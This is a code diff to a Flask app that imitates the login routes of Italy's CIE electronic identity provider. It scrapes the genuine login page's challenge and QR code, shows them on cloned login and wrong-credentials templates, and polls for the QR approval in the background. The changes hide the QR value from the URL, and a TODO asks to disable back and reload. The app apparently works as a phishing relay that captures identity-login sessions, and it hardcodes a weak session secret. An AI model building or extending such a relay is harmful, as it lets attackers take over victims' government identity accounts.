@@ -1,10 +1,18 @@
-from flask import Flask, jsonify, redirect, render_template, request, url_for
+from flask import Flask, jsonify, redirect, render_template, request, url_for, session
 import random
 from utils.state import State
 import utils.scraping as scraping
 from concurrent.futures import ThreadPoolExecutor
 
+
+# TODO:
+# - timer should not start over but retain the actual value (everytime we load the page, poll the original one to see the current value)
+# - pass qr without revealing it in the url
+# - translation
+# - make back and reload not work
+
 app = Flask(__name__)
+app.secret_key = "HPAS"
 
 random.seed()
 
@@ -34,10 +42,11 @@ def do_login():
     - go to /idp/login/livello2 page with these info as arguments
     """
     elements = scraper.get_cie_page_elements()
-    challenge = elements.get("challenge", "NA")
-    qr_str = elements.get("qr_str", "NA")
+    challenge= elements.get("challenge", "NA")
+    session["qr_str"] = elements.get("qr_str", "NA")
     op_id = elements.get("op_id", "NA")
-    return redirect(url_for('cie_level2', lang='it', challenge = challenge, qr_str = qr_str, op_id = op_id))
+    
+    return redirect(url_for('cie_level2', lang='it', challenge = challenge, op_id = op_id))
 
 @app.route('/idp/login/livello2/', methods=['GET', 'POST'])
 def cie_level2():
@@ -76,7 +85,7 @@ def cie_level2():
 
         return render_template(page)
 
-    qr_str = request.args.get('qr_str')
+    qr_str = session.get("qr_str", "")
     page = "{p}_{lang}.html".format(
         p = "wrong_credentials_cie" if state.wrong_credentials else "cie_login",
        lang = "deu" if lang == "deu" else "it"
@@ -85,7 +94,7 @@ def cie_level2():
         executor = ThreadPoolExecutor(max_workers=2)
         _ = executor.submit(scraper.qr_approve, 120)
 
-    return render_template(page, qr_str = qr_str, challenge = challenge)
+    return render_template(page, qr_str = qr_str, challenge = challenge, op_id = request.args.get('op_id'), tempoQR_ms=120000)
 
 @app.route("/idp/login/livello1e2checkpush")
 def check_push():
